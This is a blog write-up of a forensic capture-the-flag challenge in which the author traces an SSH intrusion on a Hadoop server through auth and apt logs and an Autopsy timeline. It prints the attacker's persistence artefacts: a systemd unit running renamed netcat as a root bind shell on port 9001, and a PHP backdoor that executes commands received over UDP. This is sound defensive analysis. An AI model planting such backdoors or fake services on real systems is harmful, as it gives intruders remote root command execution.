---
layout: single
title: "Magnet CTF Week 8 - Persistence in plain sight"
date: '2020-12-01T01:00:00+09:00'
author: "Joshua I. James"
tags:
  - infosec
  - dfir
  - CTF
  - Magnet
modified_time: ""
---

Magnet Forensics is running a *weekly* forensic CTF. More information can be found on their [blog](https://www.magnetforensics.com/blog/magnet-weekly-ctf-challenge/). It is a fun way to practice, so let's get to it!

### CTF Posts

[Week 1](https://dfir.science/2020/10/Magnet-CTF-Week-1-Timestamps-of-doom.html) | [Week 2](https://dfir.science/2020/10/Magnet-CTF-Week-2-URLs-in-Pictures-in-Pictures.html) | [Week 3](https://dfir.science/2020/10/Magnet-CTF-Week-3-Failed-connections.html) | [Week 4](https://dfir.science/2020/11/Magnet-CTF-Week-4-GUIDSWAP-and-drop.html) | [Week 5](https://dfir.science/2020/11/Magnet-CTF-Week-5-HDFS.html) | [Week 6](https://dfir.science/2020/11/Magnet-CTF-Week-6-Riddle-ELF.html) | [Week 7](https://dfir.science/2020/11/Magnet-CTF-Week-7-Hadoop-Nodes.html)

### Getting Started

Download the images from [Archive.org](https://archive.org/details/Case2-HDFS).

Week 8 question is in two parts. Answering the first question releases the other questions.

> Part One: What package(s) were installed by the threat actor? Select the most correct answer!

For the last three weeks, we have been looking at - what we thought - was an average user setting up Hadoop. But right under our nose was a sneaky threat actor. For this question, there are two things we need to do:

* Differentiate the threat actor from the normal user
* Identify packages the threat actor installed

In a Linux system, I always run to /var/logs/ first. There are two logs I'm interested in: /var/log/apt/term.log and /var/log/auth.log. Auth shows login events. Maybe there is something suspicious there. apt/term shows the package manager install information - including the command.

Looking through the auth.log, we can see around Oct 7 at 00:40; someone is trying to brute force SSH logins from 192.168.2.129. This isn't uncommon on Linux systems connected to the Internet, but 192.168.x.x is a local IP - whoops!

```bash
Oct  7 00:42:44 master sshd[2055]: Failed password for root from 
192.168.2.129 port 56194 ssh2
Oct  7 00:42:44 master sshd[2055]: Received disconnect from 
192.168.2.129 port 56194:11: Bye Bye [preauth]
Oct  7 00:42:44 master sshd[2055]: Disconnected from 
192.168.2.129 port 56194 [preauth]
Oct  7 00:42:44 master sshd[2055]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=
192.168.2.129  user=root
Oct  7 00:42:44 master sshd[2105]: Accepted password for hadoop from 
192.168.2.129 port 56246 ssh2
Oct  7 00:42:44 master sshd[2105]: pam_unix(sshd:session): session opened for user hadoop by (uid=0)
Oct  7 00:42:44 master systemd-logind[871]: New session 5 of user hadoop.
Oct  7 00:42:44 master sshd[2075]: Failed password for invalid user magnos from 
192.168.2.129 port 56204 ssh2
Oct  7 00:42:44 master sshd[2075]: Received disconnect from 
192.168.2.129 port 56204:11: Bye Bye [preauth]
Oct  7 00:42:44 master sshd[2075]: Disconnected from 
192.168.2.129 port 56204 [preauth]
```

Even worse, ```sshd[2105]``` was a successful login. If we look a bit later, we can see the following:

```bash
Oct  7 01:23:48 master sshd[2410]: Accepted password for hadoop from 
192.168.2.129 port 56406 ssh2
Oct  7 01:23:48 master sshd[2410]: pam_unix(sshd:session): session opened for user hadoop by (uid=0)
Oct  7 01:23:48 master systemd-logind[871]: New session 8 of user hadoop.
<!--snip-->
Oct  7 01:48:20 master sshd[2440]: Received disconnect from 
192.168.2.129 port 56406:11: disconnected by user
Oct  7 01:48:20 master sshd[2440]: Disconnected from 
192.168.2.129 port 56406
Oct  7 01:48:20 master sshd[2410]: pam_unix(sshd:session): session closed for user hadoop
Oct  7 01:48:20 master systemd-logind[871]: Removed session 8.
```

Now we have a time-frame for suspect activities - Oct 7 from 01:23:48 to 01:48:20 (local time). Twenty-five minutes on SSH is enough time to get up to some badness.

With our time-span in mind, let's jump over to the apt logs. Looking at /var/log/apt/history.log we have one package installed in the expected time-frame.

```bash
Start-Date: 2019-10-07  01:30:31
Commandline: apt install php
Install: php7.0-cli:amd64 (7.0.33-0ubuntu0.16.04.6, automatic), php-common:amd64 (1:35ubuntu6.1, automatic), php7.
<!--snip-->
End-Date: 2019-10-07  01:30:41
```

Trying "php", and **BING!** Success.

> Part Two: Why? (was the package installed) - options below:
* hosting a database
* serving a webpage
* to run a php webshell
* create a fake systemd service

Our first multiple-choice question! There are interesting because each option is essentially a hypothesis.

What we are interested in is what happened around the time the suspect was logged in? For that, I always love *timeline analysis*.

I decided to load the case up in Autopsy, which has a useful timeline tool. Timestamps in log files are based on the local clock setting at the time the log was written. However, I usually make Autopsy display UTC since I'm unsure what timezone this system was in.

I can calculate the offset since I know that PHP was installed on the 7th at 01:30. PHP7.0 was installed on Oct 6 at 22:30 UTC. That means that the time zone for the system must be UTC+3. When looking at the file-system meta-data in Autopsy, we are especially interested in Oct 6 22:23 to 22:49.

I'm also (initially) going to be interested in files created around that time. Modified will also be important, but I'll start with created to see what pops. Starting from Oct 6 at 01:30, we see PHP being installed with apt. Almost 60 seconds later, a systemd file was created named "cluster.service". Installing PHP does not install a cluster, so I'll mark that down as weird.

![Timeline view in Autopsy](/assets/images/posts/2020-Autopsy-timeline-mwctf8.jpg)

If we explore the timeline from 22:30 to 22:39 only a few files are created, but they are nasty. At 22:34 we have some instances of netcat (nc) being installed. 22:37 netcat is successfully created as /usr/bin/master. At 22:38 we have another cluster.service created in systemd, this time executing netcat (as master).

```bash
[Unit]
Description=Daemon Cluster Service
After=network.target
StartLimitIntervalSec=0
[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart=/usr/bin/master -lvp 9001 -e /bin/bash

[Install]
WantedBy=multi-user.target
```

We also have .viminfo file created with a list of suspects, haha! This file does include evidence many file edits, including /etc/sytemd/system/cluster.service.

```bash
    ###         4. Mariam Khader.                                               ### 
"3  LINE    0
    ###         3. Israa Alshamari,                                             ###
"4  LINE    0
    ###         2. Ghazi Al-Naymat,                                             ### 
"5  LINE    0
    ###         1. Ali Hadi,                                                    ###
"6  LINE    0
    ###     Team Members from PSUT:
```

Going back a bit, I checked all times around when the suspect could have been in the system. Looking at 22:28 we see an /etc/network/interfaces~ file created. Also a bit suspicious. Taking a look, we see:

```bash
[Unit]
Description=Daemon Cluster Service
After=network.target
StartLimitIntervalSec=0
[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart=/usr/bin/env php /usr/local/hadoop/bin/cluster.php

[Install]
WantedBy=multi-user.target
```

These contents are also found in systemd and ssl/certs. The suspect is trying to get persistence. Netcat was interesting, but it didn't quite answer the question of why the suspect installed PHP. Execstart is trying to execute "cluster.php". Let's take a look:

```bash
<?php
error_reporting(0);
$sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
//socket_set_option ($sock, SOL_SOCKET, SO_REUSEADDR, 1); 
if (socket_bind($sock, '0.0.0.0', 17001) == true) {
        $error_code = socket_last_error();
        $error_msg = socket_strerror($error_code);
        //echo "code: ", $error_code, " msg: ", $error_msg;
        for (;;) {
            socket_recvfrom($sock, $message, 1024000, 0, $ip, $port);
            $reply = shell_exec($message);
            socket_sendto($sock, $reply, strlen($reply), 0, $ip, $port);
        }
else {  exit;   }
```

Here is a PHP script setting up a socket on port 17001 - listening for a connection. PHP will use shell_exec to run the command locally and send the output back through the socket based on the commands received. In other words, run local commands from a remote system. Netcat does the same thing.

So, why was PHP installed? Honestly, I thought the closest right answer was to "run a PHP webshell," but that was incorrect. The next best answer was to "create a fake systemd service". **BING!** Success.

I saw no evidence of a database or a web page. To make sure, I checked the php.ini configs and whether /var/www existed (it didn't).

### Lessons learned

For most of the CTF, I've been using command-line tools or new-to-me tools that I wanted to play with. This week, I went back to Autopsy and visualized timelines. I (re)learned that a good timeline visualization with a supported suspect time range could save a lot of time. In this case, I was able to get a good time-range with auth.log. Zooming the timeline to that range pretty much tells the whole story.